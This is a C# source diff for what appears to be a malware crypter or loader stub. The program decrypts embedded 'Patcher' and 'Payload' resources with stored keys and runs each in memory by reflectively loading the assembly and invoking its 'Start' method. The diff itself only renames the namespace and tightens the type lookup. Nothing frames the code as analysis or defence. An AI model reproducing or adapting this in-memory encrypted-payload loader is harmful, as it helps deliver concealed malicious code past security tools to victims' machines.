@@ -5,8 +5,9 @@ using System.Text;
 using System.Threading.Tasks;
 using System.Reflection;
 using System.Security.Cryptography;
+using Starter;
 
-namespace Starter
+namespace EntryPoint
 {
     internal class Entry
     {
@@ -23,9 +24,9 @@ namespace Starter
             Console.WriteLine("Running Decoder.");
 #endif
 
-            var asm = Decrypt(Encoding.UTF8.GetString(Properties.Resources.Patcher), Properties.Resources.PatchKey);
+            var asm = Decrypt(Encoding.UTF8.GetString(Starter.Properties.Resources.Patcher), Starter.Properties.Resources.PatchKey);
             Execute(asm);
-            asm = Decrypt(Encoding.UTF8.GetString(Properties.Resources.Payload), Properties.Resources.Key);
+            asm = Decrypt(Encoding.UTF8.GetString(Starter.Properties.Resources.Payload), Starter.Properties.Resources.Key);
             Execute(asm);
         }
 
@@ -51,8 +52,14 @@ namespace Starter
         private static void Execute(byte[] assemblyBytes)
         {
             var assembly = System.Reflection.Assembly.Load(assemblyBytes);
-            var method = assembly.GetTypes().First(t => t.Name ==  "Entry").GetMethod("Start", BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
+            var type = assembly.GetType("EntryPoint.Entry");
+            if(type == null)
+            {
+                throw new InvalidOperationException("EntryPoint.Entry is null");
+            }
+            var method = type.GetMethod("Start", BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
             method.Invoke(null, new object[] { });
         }
     }
 }
+
